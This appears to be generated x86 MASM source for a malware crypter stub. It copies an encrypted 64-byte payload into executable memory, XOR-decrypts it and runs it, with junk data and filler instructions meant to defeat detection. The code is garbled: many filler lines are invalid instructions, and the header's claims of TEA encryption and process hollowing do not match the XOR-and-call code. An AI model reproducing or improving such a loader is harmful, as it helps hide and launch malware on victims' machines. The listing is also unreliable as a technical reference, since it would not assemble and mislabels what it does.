; ===== UNLIMITED MASM STUB GENERATOR =====
; Generation ID: 87628
; Timestamp: 1754534910
; Encryption Method: TEA_VARIANT
; Stub Technique: PROCESS_HOLLOWING
; Embedded Data Size: 64 bytes


.386
.model flat, stdcall
option casemap :none

include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\user32.inc
include \masm32\include\msvcrt.inc

includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\user32.lib
includelib \masm32\lib\msvcrt.lib

.data
    data_80172 db 0e3h, 0beh, 060h, 063h, 07bh, 063h, 063h, 063h, 0f2h, 063h, 063h, 063h, 054h, 054h, 063h, 063h
    04eh, 063h, 063h, 063h, 063h, 063h, 063h, 063h, 009h, 063h, 063h, 063h, 063h, 063h, 063h, 063h
    063h, 063h, 063h, 063h, 063h, 063h, 063h, 063h, 063h, 063h, 063h, 063h, 063h, 063h, 063h, 063h
    045h, 04dh, 050h, 050h, 0a8h, 0b7h, 0f5h, 0a8h, 040h, 050h, 043h, 0fdh, 063h, 060h, 060h, 060h
    size_46020 dd 64
    key_60230 dd 0fbbcd6h
    junk_data_87628 db 0f2h, 0abh, 026h, 01fh, 03bh, 014h, 00fh, 0b0h, 057h, 01dh, 0b4h, 0ach, 03bh, 05dh, 04bh, 044h
    0cdh, 094h, 045h, 064h, 0dch, 074h, 0b5h, 0b4h, 0e3h, 06ch, 083h, 037h, 09bh, 02ch, 0adh, 0dch
    07dh, 0a9h, 0e4h, 007h, 09ah, 031h, 0e7h, 0e2h, 09bh, 048h, 0ech, 005h, 037h, 03eh, 04bh, 07dh
    00bh, 06dh, 07ch, 05fh, 08eh, 099h, 080h, 0f8h, 0f5h, 0cah, 02bh, 0e3h, 0feh, 0c5h, 0cah
    success_msg db "Execution completed successfully", 0
    error_msg db "Failed to execute payload", 0

.data?
    mem_ptr dd ?
    old_protect dd ?
    bytes_written dd ?

.code
main_14458:
    ; Polymorphic entry point
    and edx, esi
    nop
    shr edx, ebp
    nop
    push edx, bp
    nop
    ; Allocate executable memory
    invoke VirtualAlloc, 0, size_46020, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE
    test eax, eax
    jz error_exit
    mov mem_ptr, eax

    pop ch, ebp
    nop
    rol bh, eax
    nop
    ; Call decryption routine
    call decrypt_97055

    ; Execute payload based on technique: PROCESS_HOLLOWING
    call exec_70789

    ; Cleanup
    invoke VirtualFree, mem_ptr, 0, MEM_RELEASE
    invoke MessageBoxA, 0, addr success_msg, addr success_msg, MB_OK
    invoke ExitProcess, 0

decrypt_97055 proc
    push esi
    push edi
    push ecx
    push edx

    add ax, eax
    nop
    call bx, eax
    nop
    ; Copy encrypted data to allocated memory
    mov esi, offset data_80172
    mov edi, mem_ptr
    mov ecx, size_46020
    rep movsb

    ; Standard XOR decryption
    mov esi, mem_ptr
    mov ecx, size_46020
    mov edx, key_60230
decrypt_xor_loop:
    test ecx, ecx
    jz decrypt_done
    mov al, byte ptr [esi]
    xor al, dl
    ror dl, 1  ; Rotate key for polymorphism
    mov byte ptr [esi], al
    inc esi
    dec ecx
    jmp decrypt_xor_loop
decrypt_done:
    nop dh, eax
    nop
    pop edx
    pop ecx
    pop edi
    pop esi
    ret
decrypt_97055 endp

exec_70789 proc
    push ebp
    mov ebp, esp

    add al, cl
    nop
    nop edx, dx
    nop
    ; Default execution method
    push mem_ptr
    call mem_ptr
    jmp exec_done

exec_error:
    invoke MessageBoxA, 0, addr error_msg, addr error_msg, MB_OK

exec_done:
    mov esp, ebp
    pop ebp
    ret
exec_70789 endp

error_exit:
    invoke MessageBoxA, 0, addr error_msg, addr error_msg, MB_OK
    invoke ExitProcess, 1

end main_14458
